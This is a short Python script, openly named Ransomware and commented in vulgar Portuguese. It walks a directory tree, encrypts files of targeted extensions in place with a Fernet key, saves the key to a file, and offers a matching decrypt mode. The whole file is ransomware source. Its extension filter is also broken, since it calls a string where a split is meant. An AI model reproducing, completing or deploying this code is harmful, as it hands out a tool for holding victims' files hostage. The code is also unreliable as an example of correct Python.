import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self):
        '''
        Argumentos:
            key: um penis AES de 128-bit p/ foder e desfoder o sistema

        Atributos:
            cryptor: Objeto que encripta e decripta... basicamente o bff do penis
            file_ext_targets: Lista de extensões que o penis pode foder    
        '''
        self.key = None
        self.cryptor = None
        self.file_ext_targets = ['txt']
    
    def generate_key(self):
        '''
        Gera um penis AES de 128-bit
        '''
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        '''
        Lê a key de um arquivo
        
        Args:
            keyfile_name: Caminho da file contendo a key
        '''
        with open(keyfile_name, 'rb') as penis:
            self.key = penis.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        '''
        Escreve a key na file
        '''
        with open(keyfile_name, 'wb') as penis:
            penis.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        '''
        Via recursão, o penis fode lentamente todo o root do sistema.

        Args:
            root_dir: Path absoluto do diretório
            encrypted: Tá encriptado?
        '''
        for root, _, files in os.walk(root_dir):
            for penis in files:
                abs_file_path = os.path.join(root, penis)

                if not abs_file_path('.')[-1] in self.file_ext_targets:
                    continue
            
                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        '''
        Fode e desfode uma file
        '''
        with open(file_path, 'rb+') as penis:
            _data = penis.read()

            if not encrypted:
                data = self.cryptor.encrypt(_data)
            else:
                data = self.cryptor.decrypt(_data)
            
            penis.seek(0)
            penis.write(data)

if __name__ == '__main__':
    sys_root = expanduser('~')
    local_root = '.'

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    rware = Ransomware()

    if action == 'decrypt':
        if keyfile is None:
            print('Roda direito fdp')
        else:
            rware.read_key(keyfile)
            rware.crypt_root(local_root, encrypted=True)
    elif action == 'encrypt':
        rware.generate_key()
        rware.write_key('keyfile')
        rware.crypt_root(local_root)


        